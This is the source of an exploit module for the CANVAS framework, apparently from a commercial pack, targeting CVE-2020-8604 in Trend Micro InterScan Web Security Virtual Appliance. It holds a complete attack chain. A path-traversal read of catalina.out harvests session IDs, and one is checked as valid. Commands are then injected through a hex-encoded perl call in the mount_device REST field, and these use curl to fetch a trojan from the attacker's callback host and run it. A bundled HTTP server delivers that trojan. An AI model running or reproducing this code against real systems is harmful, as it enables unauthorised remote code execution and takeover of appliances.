#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

import sys
import random
import time
import thread
import base64
import urllib, urllib2
import xml.sax.saxutils as saxutils

if "." not in sys.path: 
	sys.path.append(".")

import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import tcpexploit
from libs.canvasos import *

import struct
import canvasengine
import re

# GUI info
NAME = "Trend Micro InterScan Web Security Virtual Appliance 6.5 Remote Code Execution Vulnerability"

DESCRIPTION = "Remote code execution vulnerability in Trend Micro InterScan Web Security Virtual Appliance"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Trend Micro"
DOCUMENTATION["Date public"] = "2020.05.19"
DOCUMENTATION["VersionsAffected"] = "Trend Micro InterScan Web Security Virtual Appliance < 6.5 SP2 Patch 4"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "https://success.trendmicro.com/solution/000253095"
DOCUMENTATION["CVE Name"] = "CVE-2020-8604"
DOCUMENTATION["CVE Url"] = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8604"
DOCUMENTATION["Notes"] = ""

VERSION = "0.1"

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]

NOTES="""
-- Automatic MOSDEF trojan download and exec for Linux --
.\3rdparty\D2SEC\exploits\d2sec_tmsps\d2sec_tmiwsva4.py -v 0 -t 192.168.59.132 -l 192.168.1.1 -d 443
"""

CHANGELOG="""
"""


class theexploit(tcpexploit):
    def __init__(self):
    	tcpexploit.__init__(self)
    	self.TROJANMODE = 0
        self.cmd = ""
    	self.setInfo(DESCRIPTION)
    	self.name = NAME           
    	self.protocol = "http"
    	self.port = 1812
    	self.sslport = 8443
    	self.https = 0        
    	self.trojanname = "d2"                
    	return

 
    def maketrojan(self):    	
    	t_os = canvasos("Linux")
    	t_os.arch = "X64"
	    
    	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
    	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        		
    	file(self.trojanname, "wb").write(self.mosdeftrojan)
    	self.setInfo("%s - done"%(NAME))
    	ret = len(self.mosdeftrojan) != 0	

    	return ret	

    def makesploit(self, clientheader, clientbody):            	
    	h = spkproxy.header('SERVER')
    	b = spkproxy.body()            	
      
    	self.maketrojan()
                
    	if clientheader.URL.count(self.trojanname):
    		self.log("Sending MOSDEF trojan")
    		f = open(self.trojanname, "rb")
    		sploitstring = f.read()
    		f.close()
    		os.remove(self.trojanname)
    		self.log("Sending %d bytes"%len(sploitstring))
    		h.addHeader("Content-type","binary/octet-stream")
    		h.addHeader("Connection","close")
    		b.setBody(sploitstring)

    	return h, b


    def neededListenerTypes(self):
    	from canvasengine import LINUXMOSDEF_X64
    	return [LINUXMOSDEF_X64]


    #################################################################################################################
    # Code from httpserver.py
    def listen(self):
        self.getargs()
        s=self.gettcplistener(80, "0.0.0.0")

        if not s:
            self.log("Cannot listen on port 80 - perhaps that port is already bound?")
            return 0
        s.set_timeout(5)
        self.s=s
        return s 

    def accept(self, s=None ):
        """
        Try to accept one connection
        returns true if we found one
        """
        #we loop on this ,so no annoying printouts here
        #self.log("Accepting connection")
        if s==None:
            s=self.s 
        try:
            infd,addr=s.accept()
        except timeoutsocket.Timeout:
            #self.log("Timed out - no accept yet")
            return 
        if infd==-1:
            return

        #else we have an infd
        self.handle(infd)
        return True #handled connection
        
    def handle(self, infd): 
        self.log("Handling connection")
        clientheader = spkproxy.header(state = "SERVER")
        clientheader.ssl = self.ssl
        ret = clientheader.readdata(infd)
        clientbody = spkproxy.body()
        
        if clientheader.gotGoodHeader():
            if clientheader.bodySize()>0 or clientheader.wasChunked:
                self.log("Reading body")
                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
                self.log("Read body")

        self.log("Creating exploit response")

        servheader,servbody = self.makesploit(clientheader,clientbody)
        
        self.log("Responding")
        
        bodydata="".join(servbody.data)
                    
        #now we respond...
        response = ""
        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
	
	self.log(response)

        for akey in servheader.headerValuesDict.keys():
            if akey not in [ "Content-Length", "Content-length"]:
                response += servheader.grabHeader(akey)
        self.log("Sending header data of %d bytes"%len(response))
        chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
        if not chunked:
            response+="Content-Length: "+str(len(bodydata))+"\r\n"
        response+="\r\n"
        response+="".join(bodydata)
        self.log("Total response length is %d bytes"%len(response))
        try:
            infd.sendall(response)
        except socket.error:
            self.log("Connection closed by peer")
        self.log("Response sent")
        infd.close() #connection close - later on we'll keep it.
        return 
    #
    #################################################################################################################
        
        
    def startHTTPServer(self):
    	s = self.listen()
        
    	if not s:
    		self.log("Failed to listen - not running")
    		return 0
    		
    	while 1:
    		if self.state==self.HALT:
    			self.s.close()
    			break
    			
    		self.accept()

    	self.setInfo("%s on %s:80 - done (success!)"%(NAME, self.bindip))
        
    	return 1    	
    
    def send_cmd(self, ua, port, cmd, validid):    	    	    	
        ua.addHeader("Cookie", "JSESSIONID=%s"%validid)
        ua.addHeader("Content-Type", "application/json")
        encoded_cmd = "".join("{:02x}".format(ord(c)) for c in cmd)
        cmd = "perl -e 'system(pack(qq,H%d,,qq,%s,))'"%(len(encoded_cmd),encoded_cmd)            
        url = "/rest/commonlog/log_setting/mount_device"               
        params = """{
    "mount_device": "mount $(%s) /var/offload",
    "cmd": "mount"
}        
        """%cmd                       
        mainurl = "%s://%s:%d%s" % (self.protocol, self.host, port, url)            	   	
        data = ua.POST(mainurl, params)
          
    def run(self):    	    	
    	# Check arguments
    	self.host = self.target.interface
    	self.port = int(self.argsDict.get("port", self.port))
    	self.sslport = int(self.argsDict.get("sslport", self.sslport))
    	self.https = int(self.argsDict.get("https", self.https))
                                    			    		
    	thread.start_new_thread(self.startHTTPServer,())

        if self.https == 0:
            self.protocol = "http"
            port = self.port
        else:
            self.protocol = "https"            
            port = self.sslport    	                	               
    	
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
        self.log("Attacking %s:%d"%(self.host, port))                
      		
    	ua = spkproxy.UserAgent("", exploit=self)
    	ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")

        # Get session id
        url = "/solr/collection0/replication?command=filecontent&wt=filestream&generation=1&file=../../../../../../../var/iwss/tomcat/logs/catalina.out"        
        mainurl = "http://%s:8983%s" % (self.host, url)
        data = ua.GET(mainurl)
        m = re. findall("CheckUserLogon sessionid : (.+)", data)
        if m is None:
            self.log("[D2SEC] - Session ID not found")
            return 0
        sessionids = []    
        for sessionid in m:
            sessionids.append(sessionid)            

        # Find an active session ID
        validid = ''
        for sessionid in sessionids:
            ua.addHeader("Cookie", "JSESSIONID=%s"%sessionid)
            url = '/rest/commonlog/get_sessionID'        
            mainurl = "%s://%s:%d%s" % (self.protocol, self.host, port, url)
            data = ua.GET(mainurl)
            if 'session_flag' in data:
                validid = sessionid
                break
        if validid == '':
            self.log("[D2SEC] - Valid Session ID not found")
            return 0
        
        self.log("[D2SEC] - Valid Session ID found: %s"%validid)
                                
        # Exploitation
        cmd = "/bin/rm -f /tmp/" + self.trojanname
        self.send_cmd(ua, port, cmd, validid)            
        cmd = "/usr/bin/curl -o /tmp/" + self.trojanname + " http://" + self.callback.ip + "/" + self.trojanname
        self.send_cmd(ua, port, cmd, validid)            
        cmd =  "/bin/chmod 777 /tmp/" + self.trojanname
        self.send_cmd(ua, port, cmd, validid)                        
        cmd = "/tmp/" + self.trojanname
        self.send_cmd(ua, port, cmd, validid)                    
                                              	    	    	    	              	        
    	while 1:
    		time.sleep(1)

    	return 1
    	
        		
    def usage(self):        
    	print "Usage: %s -t targethost -l localip -d localport [-O cmd:command]\n" % sys.argv[0]

    	i = 0

    	print 'Available versions:'

    	for listline in targets.values():
    		print '\t%d: %s'%(i, listline)
    		i = i + 1

    	sys.exit(0) 


if __name__ == '__main__':
	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)
